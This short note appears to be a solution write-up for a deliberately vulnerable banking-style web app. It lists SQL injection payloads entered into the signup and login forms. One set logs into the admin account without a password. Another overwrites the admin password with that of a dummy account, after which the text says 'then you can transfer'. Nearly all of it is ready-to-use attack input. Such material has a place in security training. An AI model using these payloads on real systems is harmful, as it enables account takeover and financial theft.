ORIGINALLY INTENDED :

In signup form :

1st. dummy' or username='admin' order by username desc limit '1
2nd. dummy';select * from accounts where username='admin

This will log us onto the admin accounts without any password requirements. (Press F5 once logged)
Then you can transfer.




In login form :

dummy';update accounts set password=(select password from accounts where username='dummy') where username='admin

This will change the password to the admin's account to the password of the dummy account.
Then you can transfer.
